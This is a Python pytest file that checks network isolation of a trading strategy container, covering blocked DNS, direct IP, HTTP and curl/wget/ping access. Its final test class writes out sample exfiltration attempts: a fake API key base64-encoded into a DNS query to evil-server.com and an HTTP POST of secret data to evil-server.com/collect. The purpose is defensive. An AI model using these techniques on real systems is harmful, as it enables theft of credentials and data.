"""Network isolation tests for strategy container.

These tests verify that the strategy container cannot access external networks.
They are designed to be run inside the strategy container via docker-compose.

These tests will SKIP when run on the host machine (outside Docker) since
network isolation is only enforced inside the container.

Usage:
    # Build and run isolation tests in container
    docker-compose -f deploy/docker/docker-compose.test.yml run --rm strategy-test

    # Or run specific test
    docker-compose -f deploy/docker/docker-compose.test.yml run --rm strategy-test \
        pytest tests/gateway/test_network_isolation.py -v

    # Running locally will skip all tests (expected behavior)
    pytest tests/gateway/test_network_isolation.py -v
"""

import os
import socket
import subprocess

import pytest


# Detect if we're running inside Docker by checking for /.dockerenv or cgroup
def _is_running_in_docker() -> bool:
    """Check if we're running inside a Docker container."""
    # Method 1: Check for .dockerenv file
    if os.path.exists("/.dockerenv"):
        return True
    # Method 2: Check cgroup (Linux)
    try:
        with open("/proc/1/cgroup") as f:
            return "docker" in f.read()
    except (FileNotFoundError, PermissionError):
        pass
    # Method 3: Check for DOCKER_CONTAINER env var (set in our Dockerfile)
    if os.environ.get("DOCKER_CONTAINER") == "1":
        return True
    return False


IN_DOCKER = _is_running_in_docker()

# Skip all tests in this module if not running in Docker
pytestmark = pytest.mark.skipif(not IN_DOCKER, reason="Network isolation tests only run inside Docker container")


class TestDNSResolution:
    """Tests that DNS resolution fails from strategy container."""

    def test_cannot_resolve_google(self):
        """Strategy container cannot resolve google.com."""
        with pytest.raises((socket.gaierror, socket.timeout, OSError)):
            socket.setdefaulttimeout(5)
            socket.gethostbyname("google.com")

    def test_cannot_resolve_api_coingecko(self):
        """Strategy container cannot resolve api.coingecko.com."""
        with pytest.raises((socket.gaierror, socket.timeout, OSError)):
            socket.setdefaulttimeout(5)
            socket.gethostbyname("api.coingecko.com")

    def test_cannot_resolve_api_binance(self):
        """Strategy container cannot resolve api.binance.com."""
        with pytest.raises((socket.gaierror, socket.timeout, OSError)):
            socket.setdefaulttimeout(5)
            socket.gethostbyname("api.binance.com")

    def test_cannot_resolve_arbitrary_domain(self):
        """Strategy container cannot resolve arbitrary domains."""
        with pytest.raises((socket.gaierror, socket.timeout, OSError)):
            socket.setdefaulttimeout(5)
            socket.gethostbyname("evil-exfiltration-server.com")

    def test_can_resolve_gateway(self):
        """Strategy container CAN resolve gateway (internal network)."""
        # This should succeed - gateway is on the internal network
        try:
            addr = socket.gethostbyname("gateway")
            assert addr is not None
            # Should be an internal IP (172.x.x.x or 10.x.x.x)
            assert addr.startswith("172.") or addr.startswith("10.") or addr.startswith("192.168.")
        except socket.gaierror:
            # If DNS doesn't work, gateway should still be reachable via docker network
            pytest.skip("Gateway DNS not configured - testing direct connectivity instead")


class TestDirectIPAccess:
    """Tests that direct IP access to external hosts fails."""

    def test_cannot_connect_to_google_dns(self):
        """Strategy container cannot connect to Google DNS (8.8.8.8)."""
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        try:
            # This should fail - no route to external IPs
            result = sock.connect_ex(("8.8.8.8", 53))
            # connect_ex returns 0 on success, error code on failure
            assert result != 0, "Should not be able to connect to 8.8.8.8"
        except (TimeoutError, OSError):
            # Expected - connection should fail
            pass
        finally:
            sock.close()

    def test_cannot_connect_to_cloudflare_dns(self):
        """Strategy container cannot connect to Cloudflare DNS (1.1.1.1)."""
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        try:
            result = sock.connect_ex(("1.1.1.1", 53))
            assert result != 0, "Should not be able to connect to 1.1.1.1"
        except (TimeoutError, OSError):
            pass
        finally:
            sock.close()

    def test_cannot_connect_to_http_port(self):
        """Strategy container cannot connect to external HTTP (port 80)."""
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        try:
            # Try to connect to a well-known IP on port 80
            result = sock.connect_ex(("142.250.80.100", 80))  # google.com IP
            assert result != 0, "Should not be able to connect to external HTTP"
        except (TimeoutError, OSError):
            pass
        finally:
            sock.close()

    def test_cannot_connect_to_https_port(self):
        """Strategy container cannot connect to external HTTPS (port 443)."""
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        try:
            result = sock.connect_ex(("142.250.80.100", 443))  # google.com IP
            assert result != 0, "Should not be able to connect to external HTTPS"
        except (TimeoutError, OSError):
            pass
        finally:
            sock.close()


class TestGatewayConnectivity:
    """Tests that gateway IS reachable from strategy container."""

    def test_can_connect_to_gateway_grpc_port(self):
        """Strategy container CAN connect to gateway on gRPC port."""
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        try:
            # Gateway should be reachable on internal network
            result = sock.connect_ex(("gateway", 50051))
            assert result == 0, f"Should be able to connect to gateway:50051, got error {result}"
        except socket.gaierror:
            pytest.skip("Gateway hostname not resolvable - may not be running in docker")
        finally:
            sock.close()


class TestHTTPRequests:
    """Tests that HTTP requests to external sites fail."""

    def test_cannot_http_get_google(self):
        """Strategy container cannot make HTTP request to google.com."""
        import urllib.error
        import urllib.request

        with pytest.raises((urllib.error.URLError, socket.timeout, OSError)):
            urllib.request.urlopen("http://google.com", timeout=5)

    def test_cannot_https_get_coingecko(self):
        """Strategy container cannot make HTTPS request to coingecko.com."""
        import urllib.error
        import urllib.request

        with pytest.raises((urllib.error.URLError, socket.timeout, OSError)):
            urllib.request.urlopen("https://api.coingecko.com/api/v3/ping", timeout=5)


class TestSubprocessNetworkAccess:
    """Tests that subprocesses also cannot access external networks."""

    def test_curl_fails(self):
        """curl command fails to reach external sites."""
        result = subprocess.run(
            ["curl", "-s", "-m", "5", "http://google.com"],
            capture_output=True,
            timeout=10,
        )
        # curl should fail (non-zero exit code)
        assert result.returncode != 0, "curl should fail to reach external sites"

    def test_wget_fails(self):
        """wget command fails to reach external sites."""
        try:
            result = subprocess.run(
                ["wget", "-q", "-T", "5", "-O", "/dev/null", "http://google.com"],
                capture_output=True,
                timeout=10,
            )
            # wget should fail (non-zero exit code)
            assert result.returncode != 0, "wget should fail to reach external sites"
        except FileNotFoundError:
            pytest.skip("wget not installed in container")

    def test_ping_fails(self):
        """ping command fails to reach external IPs."""
        result = subprocess.run(
            ["ping", "-c", "1", "-W", "5", "8.8.8.8"],
            capture_output=True,
            timeout=10,
        )
        # ping should fail
        assert result.returncode != 0, "ping should fail to reach external IPs"


class TestDataExfiltration:
    """Tests that common data exfiltration techniques fail."""

    def test_cannot_exfiltrate_via_dns(self):
        """Cannot exfiltrate data via DNS queries."""
        # Attempt to encode data in DNS query
        import base64

        secret_data = "ALCHEMY_API_KEY=secret123"
        encoded = base64.b64encode(secret_data.encode()).decode()
        fake_domain = f"{encoded}.evil-server.com"

        with pytest.raises((socket.gaierror, socket.timeout, OSError)):
            socket.setdefaulttimeout(5)
            socket.gethostbyname(fake_domain)

    def test_cannot_exfiltrate_via_http_post(self):
        """Cannot exfiltrate data via HTTP POST."""
        import urllib.error
        import urllib.request

        data = b"secret_data=API_KEY_HERE"

        with pytest.raises((urllib.error.URLError, socket.timeout, OSError)):
            req = urllib.request.Request(
                "http://evil-server.com/collect",
                data=data,
                method="POST",
            )
            urllib.request.urlopen(req, timeout=5)
